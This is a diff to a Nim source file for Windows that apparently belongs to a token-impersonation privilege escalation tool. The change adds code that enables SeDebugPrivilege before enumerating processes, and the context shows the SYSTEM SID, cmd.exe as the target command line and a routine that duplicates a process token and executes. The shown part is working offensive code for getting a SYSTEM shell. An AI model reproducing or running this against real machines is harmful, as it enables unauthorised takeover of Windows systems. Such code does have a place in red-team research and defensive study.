@@ -1,10 +1,34 @@
 import winim
+import winim/lean
+import winim/inc/windef
+import winim/inc/winbase
+import winim/inc/objbase
 from std/winlean import getLastError
 
 var cmdline = "C:\\Windows\\System32\\cmd.exe"
-var system_sid = "S-1-5-18"
-var isDebug = true
+let system_sid = "S-1-5-18"
+let isDebug = true
 
+
+proc SetPrivilege(lpszPrivilege:string): bool=
+    # inits
+    var tp : TOKEN_PRIVILEGES
+    var luid: LUID 
+    var HTtoken: HANDLE
+    # open current process token
+    discard OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &HTtoken)
+    # get current privilege
+    if LookupPrivilegeValue(NULL, lpszPrivilege, &luid) == 0:
+        return false
+    # enable privilege
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
+    tp.PrivilegeCount = 1
+    tp.Privileges[0].Luid = luid
+    # set privilege
+    if AdjustTokenPrivileges(HTtoken, FALSE, &tp, cast[DWORD](sizeof(TOKEN_PRIVILEGES)), NULL, NULL) == 0:
+        return false
+    # success
+    return true
 
 proc convertSidToStringSidA(Sid: PSID, StringSir: ptr LPSTR): NTSTATUS {.cdecl, importc: "ConvertSidToStringSidA", dynlib: "Advapi32.dll".}
 
@@ -93,13 +117,20 @@ proc dupicateAndExecute(pid: int): void =
     CloseHandle(hToken)
 
 proc main(): void =
+    
+    # inits
     var entry: PROCESSENTRY32
     var hSnapshot: HANDLE
     entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
-    
+
+    # enable SeDebugPrivilege
+    if isDebug:
+        echo "[*] Enabling SeDebugPrivilege"
+    if not SetPrivilege("SeDebugPrivilege"):
+        echo "\t[-] Failed to enable SeDebugPrivilege"
     if isDebug:
         echo "[*] Calling CreateToolhelp32Snapshot"
-
+    
     # get all processes
     hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
     defer: CloseHandle(hSnapshot)
